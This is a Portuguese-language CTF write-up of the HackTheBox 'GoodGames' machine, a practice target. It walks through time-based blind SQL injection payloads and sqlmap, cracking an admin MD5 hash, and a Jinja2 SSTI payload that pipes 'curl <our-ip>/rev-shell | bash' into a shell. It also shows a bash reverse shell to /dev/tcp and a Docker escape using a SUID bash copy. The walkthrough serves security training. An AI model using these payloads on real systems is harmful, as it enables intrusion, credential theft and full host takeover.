---
title: "GoodGames - HackTheBox"
date: 2024-01-13
published: true
lang: pt-BR
translation_key: "goodgames-htb"
original_url: /goodgames-htb
permalink: /pt-br/goodgames-htb
---
# [](#intro)Introdução

Vamos resolver outro [HackTheBox](https://app.hackthebox.com) CTF. Nesta caixa, vamos ver a injeção SQL, a injeção do modelo do lado do servidor (SSTI) e a fuga do Docker.


# [](#level-description)Challenge description

A descrição do desafio é:

> Sobre os Bons Jogos
>
> GoodGames é uma máquina de linux fácil que mostra a importância de higienizar entradas de usuário em aplicações web para evitar ataques de injeção SQL, usando algoritmos de hashing forte em estruturas de banco de dados para evitar a extração e quebra de senhas de um banco de dados comprometido, juntamente com os perigos de reutilização de senha. Ele também destaca os perigos de usar o `render_template_string` em uma aplicação web Python onde a entrada do usuário é refletida, permitindo ataques de Injeção de Modelos Lateral de Servidor (SSTI). A escalada do privilégio envolve a enumeração de hosts docker e mostra como ter privilégios de administrador em um contêiner e um usuário de baixo privilégio na máquina host pode ser perigoso, permitindo que atacantes aumentem os privilégios para comprometer o sistema.

Muito descritivo, não é? A descrição já nos diz que caminho devemos tomar
para resolver o desafio.

# [](#approach)Approach mindset

Para nossa mentalidade de abordagem, vamos separá-la como os seguintes passos:

1. Reconhecimento
2. Obtendo apoio
3. Criando o ataque
4. Obtendo raiz

Cada conceito, incluindo injeção SQL, SSTI e Docker escape, será explicado conforme necessário ao longo dos quatro passos.

## [](#step1-recon)Passo 1 - Reconhecimento

Está bem. Como um procedimento básico para resolver qualquer caixa ou máquina tipo CTF, vamos começar a enumerar as portas do sistema. Para fazer isso,
vamos usar o Nmap:

```bash
$ nmap -p- -T4 --min-rate 1000 -A -oN ports.nmap 10.129.96.71
# Nmap 7.94 scan initiated Sun Jan  7 23:08:10 2024 as: nmap -p- -T4 --min-rate 1000 -A -oN ports.nmap 10.129.96.71
Nmap scan report for 10.129.96.71
Host is up (0.30s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.48
|_http-title: GoodGames | Community and Store
|_http-server-header: Werkzeug/2.0.2 Python/3.9.2
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94%E=4%D=1/7%OT=80%CT=1%CU=40632%PV=Y%DS=2%DC=T%G=Y%TM=659B2F51
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)OPS(
OS:O1=M53AST11NW7%O2=M53AST11NW7%O3=M53ANNT11NW7%O4=M53AST11NW7%O5=M53AST11
OS:NW7%O6=M53AST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(
OS:R=Y%DF=Y%T=40%W=FAF0%O=M53ANNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
OS:S)

Network Distance: 2 hops
Service Info: Host: goodgames.htb

TRACEROUTE (using port 554/tcp)
HOP RTT       ADDRESS
1   274.29 ms 10.10.16.1
2   130.91 ms 10.129.96.71

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jan  7 23:10:09 2024 -- 1 IP address (1 host up) scanned in 119.67 seconds
```
Mostrar a única porta aberta é um serviço web na porta 80. Vamos acessá-lo com o nosso navegador preferido.

<img src="../figs/ggs1.png" alt="GoodGames homepage">

Olhando para ele, notamos algumas coisas: primeiro, temos uma maneira de registrar uma nova conta clicando no link do canto superior direito.
É sempre um bom ponto de partida ao realizar um pentest para registrar uma conta e verificar quais as funcionalidades dentro do
poderes de um usuário normal. Quando clicamos no ícone do homenzinho, temos um botão para registar uma nova conta. Vamos a isso. Após
registrando uma nova conta, podemos acessá-la usando o mesmo ícone, mas agora fornecendo nossas credenciais. Esta é a página que chegamos
Após o login:

Injeção SQL

<img src="../figs/ggs2.png" alt="mula profile page">

Já que o desafio nos fala explicitamente sobre uma vulnerabilidade de injeção SQL, vamos fazer logout e fazer logon de volta, mas agora
analisaremos a solicitação usando o BurpSuite:

<img src="../figs/ggs3.png" alt="burpsuite login request">

Depois de alguns testes, descobri que o servidor estava respondendo com
Mensagem de 'Erro no Servidor Interno' (mesmo com um código de estado de 200) se eu estava dando um e-mail correto com credenciais erradas:

<img src="../figs/ggs4.png" alt="wrong credentials attempt">

E também algumas cargas de injeção SQL, como `'+and+1=1--;`, não estavam funcionando. Estes estavam me dando 'credenciais incorretos fornecidos' para
alguma razão, mesmo com a senha correta.

<img src="../figs/ggs5.png" alt="sqli attempt fail">

Então isso me fez pensar que nem `--` nem `;` estava sendo interpretado como linhas de comentários.
Talvez estejam a ser escapadas. Outra possibilidade é usar `#`. Foi o que tentei e funcionou.

<img src="../figs/ggs6.png" alt="sqli success">

Incrível! Agora que nós agora que este é o nosso ponto de injeção, podemos tentar enumerar o banco de dados para encontrar uma conta de administrador de
Algum tipo. Uma vez que esta injeção não nos devolve nada, teremos de basear a nossa pesquisa às cegas. [This](https://github.com/kleiton0x00/Advanced-SQL-Injection-Cheatsheet/blob/main/MySQL%20-%20Time%20Based%20SQLi/README.md)
repo é ótimo para testar SQLi baseado no tempo. A carga específica `mula%40mula.com'XOR(if(now()=sysdate(),sleep(5*5),0))OR'#--;` confirmou
um atraso de tempo de 25 segundos para o servidor responder, portanto, a vulnerabilidade.

Como recuperar tudo manualmente levaria uma quantidade desnecessária de trabalho, usaremos o SQLmap em nossa vantagem. Isto é o que eu tenho
run:

```bash
$ sqlmap -u http://10.129.96.71/login --data "email=mula@mula.com&password=1234" --tables
[...snip...]
id,email,name,password
1,admin@goodgames.htb,admin,2b22337f218b2d82dfc3b6f77e7cb8ec
2,mula@mula.com,mula,81dc9bdb52d04dc20036dbd8313ed055 (1234)
```
E agora temos a conta de administrador + seu hash de senha. Com uma busca rápida, podemos encontrar este hash para ser um hash MD5:

<img src="../figs/ggs7.png" alt="hash is md5">

Podemos [CrackStation](https://crackstation.net/) para quebrar este hash:

<img src="../figs/ggs8.png" alt="cracstation result">

Temos o par de credenciais `admin@goodgames.htb:superadministrator`. Vamos entrar com esta conta agora:

<img src="../figs/ggs9.png" alt="admin profile">

Observe que no canto superior direito temos agora um ícone de engrenagem que leva a http://internal-administration.goodgames.htb/. Para aceder a isto
página, vamos precisar adicionar este domínio ao nosso diretório `/etc/hosts`. Basta correr.

```bash
$ sudo echo "<machine-ip> internal-administration.goodgames.htb" >> /etc/hosts
```
e você deve ser capaz de acessá-lo logo depois.

# # SSTI

Uma vez que estamos dentro do painel de administração, podemos ver muitas funcionalidades diferentes. Enquanto a maioria deles é ilustrativa, eu tenho
Este é o único com quem podemos brincar.

<img src="../figs/ggs10.png" alt="admin panel change name">

Nós podemos mudar nosso nome para outra coisa aqui, e uma vez que este é o único ponto onde podemos realmente testar, este deve ser
a relativa à vulnerabilidade da injeção do modelo lateral do servidor (SSTI). Mas o que é SSTI?

SSTI é uma vulnerabilidade que ocorre quando uma aplicação permite que a entrada fornecida pelo usuário seja executada como parte do processo de renderização do modelo. Isso pode levar à execução de código arbitrário, potencialmente levando a comprometimento do servidor ou vazamento de dados.
Na pior das hipóteses, poderíamos até ter uma shell reversa, dependendo de como o servidor higieniza a entrada.

Como estamos lidando com uma aplicação Flask, podemos limitar nosso escopo de pesquisa ao Python SSTI. Numa busca rápida,
Eu encontrei [este atributo ](https://kleiber.me/blog/2021/10/31/python-flask-jinja2-ssti-example/) sobre exemplos de Flask SSTI.
Nele, podemos ver que um parâmetro testável é \{\{2*3\}\} por exemplo. Isso iria transformar no número 6. Desde a mudança
seu nome completo na aplicação resulta em uma renderização de modelo, esta é uma carga útil perfeita para testá-lo.

<img src="../figs/ggs11.png" alt="ssti first paylaod">

Como podemos ver, a vulnerabilidade está presente.

## [](#step3-foothold)Passo 2 - Obtendo apoio

De acordo com o artigo, podemos ver que uma maneira de criar uma shell reversa é
fazer o servidor baixar um script bash da nossa máquina local e executá-lo. Para isso, precisamos criar um arquivo com
o seguinte comando:

```bash
#!/bin/bash
bash -c "bash -i >& /dev/tcp/<our-ip>/<port> 0>&1"
```
Salve-o sob o nome de `rev-shell` e, em seguida, iniciar o nosso netcat na mesma porta que digitamos no script. Então...
precisamos ter certeza que o servidor também baixa o arquivo `rev-shell`. Para fazer isso, também abriremos um servidor Python
Na porta 80. Depois de tudo isso está configurado, enviamos esta carga útil para o servidor:


{% raw %}
```
{{request.application.__globals__.__builtins__.__import__('os').popen('curl <our-ip>/rev-shell | bash').read()}}
```
{% endraw %}

E temos a nossa concha!

<img src="../figs/ggs12.png" alt="rev shell" >

Primeiro, somos root, mas a ausência da bandeira root no diretório /root nos mostra que podemos estar dentro de um recipiente Docker, e que somos root dentro do recipiente. Na vida real, não teríamos uma bandeira esperando por nós em /root, então precisamos recorrer a outras técnicas para verificar se estamos dentro de um recipiente Docker.
A primeira coisa que podemos fazer é executar ifconfig e verificar o endereço IP da máquina:

```bash
root@3a453ab39d3d:/backend# ifconfig
ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.19.0.2  netmask 255.255.0.0  broadcast 172.19.255.255
        ether 02:42:ac:13:00:02  txqueuelen 0  (Ethernet)
        RX packets 1538  bytes 235795 (230.2 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1341  bytes 2871375 (2.7 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```
Podemos ver que o nosso IP não corresponde ao da caixa real. Outra maneira de verificar se estamos mesmo dentro de um recipiente Docker
é para ver se existe um arquivo `.dockerenv` no `/`:


```bash
root@3a453ab39d3d:/backend# ls / -la
ls / -la
total 88
drwxr-xr-x   1 root root 4096 Nov  5  2021 .
drwxr-xr-x   1 root root 4096 Nov  5  2021 ..
-rwxr-xr-x   1 root root    0 Nov  5  2021 .dockerenv
drwxr-xr-x   1 root root 4096 Nov  5  2021 backend
drwxr-xr-x   1 root root 4096 Nov  5  2021 bin
drwxr-xr-x   2 root root 4096 Oct 20  2018 boot
drwxr-xr-x   5 root root  340 Jan 12 23:03 dev
drwxr-xr-x   1 root root 4096 Nov  5  2021 etc
drwxr-xr-x   1 root root 4096 Nov  5  2021 home
[...snip...]
```
Um teste final que podemos realizar para determinar se estamos operando dentro de um ambiente Docker é examinar como o sistema de arquivos é montado:

```bash
root@3a453ab39d3d:/backend# df -h
df -h
Filesystem      Size  Used Avail Use% Mounted on
overlay         8.9G  5.3G  3.2G  63% /
tmpfs            64M     0   64M   0% /dev
tmpfs           2.0G     0  2.0G   0% /sys/fs/cgroup
/dev/sda1       8.9G  5.3G  3.2G  63% /home/augustus
shm              64M     0   64M   0% /dev/shm
tmpfs           2.0G     0  2.0G   0% /proc/acpi
tmpfs           2.0G     0  2.0G   0% /sys/firmware
```
Esta saída revela um sistema de arquivos sobreposto montado no `/`, que é típico para recipientes Docker. Ele também mostra `/dev/sda1` montado em `/home/augustus`, indicando uma montagem de ligação ou um volume. Este ponto de montagem específico sugere
um diretório do sistema host (/home/augustus) está sendo mapeado no recipiente, uma prática comum no Docker para persistência ou compartilhamento de dados entre o hospedeiro e o recipiente.

Uma coisa que é importante notar é que em um ambiente Docker, cada recipiente é tipicamente atribuído um endereço IP de uma sub-rede gerenciada pelo Docker. O comportamento padrão é para o Docker criar uma rede de ponte e atribuir endereços IP a cada recipiente conectado a esta rede. O primeiro IP na subrede, muitas vezes terminando em .1, é geralmente atribuído ao gateway da rede ponte Docker, o que facilita a comunicação entre os contêineres e a máquina hospedeira.

Uma vez que o IP do nosso recipiente termina com .2, então é altamente provável que o endereço .1 é o que liga o recipiente ao
Máquina hospedeira. Podemos verificar se a porta SSH neste gateway está aberta usando este comando:

```bash
timeout 3 bash -c 'cat < /dev/null > /dev/tcp/172.19.0.1/22'
```
Se nenhuma mensagem de erro é mostrada, então é provável que a porta esteja aberta e podemos tentar SSH para a máquina. De nossa enumeração, descobrimos que `augustus` é um usuário. Com base na descrição do problema, vemos que menciona a reutilização da senha. Se
é o caso, então as credenciais SSH podem ser `augustus:superadministrator`:

```bash
root@3a453ab39d3d:/backend# ssh augustus@172.19.0.1
ssh augustus@172.19.0.1
augustus@172.19.0.1 password: superadministrator

Linux GoodGames 4.19.0-18-amd64 #1 SMP Debian 4.19.208-1 (2021-09-29) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sat Jan 13 16:19:33 2024 from 172.19.0.2
augustus@GoodGames:~$ 
```
E estamos fora do contentor! No entanto, agora não somos raízes. Como poderíamos obter raiz ter acesso a um recipiente privilegiado e
para um usuário menos privilegiado na máquina anfitriã?

## [](#step3-crafting-the-attack)Passo 3 - Criando o ataque

O passo inicial a considerar é verificar se as transferências de arquivos do recipiente privilegiado para o usuário 'augustus' são viáveis. Dado que o /dev/sda1 está montado em /home/augustus, uma abordagem prática seria copiar um arquivo para este diretório dentro do host. Posteriormente, podemos verificar se o arquivo aparece no recipiente para confirmar o sucesso da transferência.

Dentro da máquina com usuário 'augustus', nós corremos:

```bash
augustus@GoodGames:~$ touch test-file
touch test-file
augustus@GoodGames:~$ ls -la
ls -la
total 24
drwxr-xr-x 2 augustus augustus 4096 Jan 13 16:45 .
drwxr-xr-x 3 root     root     4096 Oct 19  2021 ..
lrwxrwxrwx 1 root     root        9 Nov  3  2021 .bash_history -> /dev/null
-rw-r--r-- 1 augustus augustus  220 Oct 19  2021 .bash_logout
-rw-r--r-- 1 augustus augustus 3526 Oct 19  2021 .bashrc
-rw-r--r-- 1 augustus augustus  807 Oct 19  2021 .profile
-rw-r--r-- 1 augustus augustus    0 Jan 13 16:45 test-file
-rw-r----- 1 root     augustus   33 Jan 12 23:04 user.txt   
```
Então, voltamos para o recipiente e vemos se o arquivo está presente:

```bash
root@3a453ab39d3d:/home/augustus# ls -la test-file
ls -la test-file
-rw-r--r-- 1 1000 1000 0 Jan 13 16:45 test-file
```
Sucesso! Como podemos acessar arquivos criados por 'augustus', temos o potencial de obter acesso root. Isso pode ser conseguido copiando o binário /bin/bash para /home/augustus dentro da máquina host, configurando seu bit SUID e onwership para root no recipiente, e então executando-o no usuário 'augustus'. Este método é provável nos conceder acesso root na máquina host.


## [](#solving) Obtendo raiz

Vamos experimentar! Primeiro, corremos:

```bash
augustus@GoodGames:~$ cp /bin/bash ./badbash
cp /bin/bash ./badbash
```
Depois:

```bash
root@3a453ab39d3d:/home/augustus# chown root:root badbash
chown root:root badbash
root@3a453ab39d3d:/home/augustus# chmod 4777 badbash
chmod 4777 badbash
root@3a453ab39d3d:/home/augustus# ls -la badbash
ls -la badbash
-rwsrwxrwx 1 root root 1168776 Jan 13 16:48 badbash
```
Agora, de volta à máquina anfitriã:

```bash
augustus@GoodGames:~$ ls -la badbash
ls -la badbash
-rwsrwxrwx 1 root root 1168776 Jan 13 16:48 badbash
augustus@GoodGames:~$ ./badbash -p
./badbash -p
badbash-5.0# whoami
whoami
root
```
E temos raiz na máquina hospedeira! Agora podemos recuperar as bandeiras.

```bash
badbash-5.0# echo "User flag:";cat /home/augustus/user.txt;echo "Root flag:";cat /root/root.txt
<ustus/user.txt;echo "Root flag:";cat /root/root.txt
User flag:
c48d858e747788869b014967d28dd872
Root flag:
bdb613146b47f0a8c563b9fda49567ea
```
# [](#conclusions)Conclusão
Este CTF tinha bons conceitos para praticar: variando de injeção SQL, para a injeção de modelo lateral do servidor e, em seguida,
Docker escapar com um recipiente privilegiado e acesso de acolhimento menos privilegiado.

Com a injeção SQL, temos o administrador
usuário no site. Conseguimos explorar com sucesso a vulnerabilidade da Injeção de Modelo Lateral do Servidor (SSTI) e obter acesso ao recipiente do sistema. Devido a falhas de implementação, fomos capazes de aumentar nossos privilégios, escapando do ambiente Docker e usando tanto o recipiente e um usuário menos privilegiado no host para obter acesso root. Isso nos permitiu ter controle total sobre o sistema.

Espero que você tenha gostado deste texto e aprendido algo novo. Como sempre, não se esqueça de fazer sua pesquisa **!

<a href="/">Voltar</a>
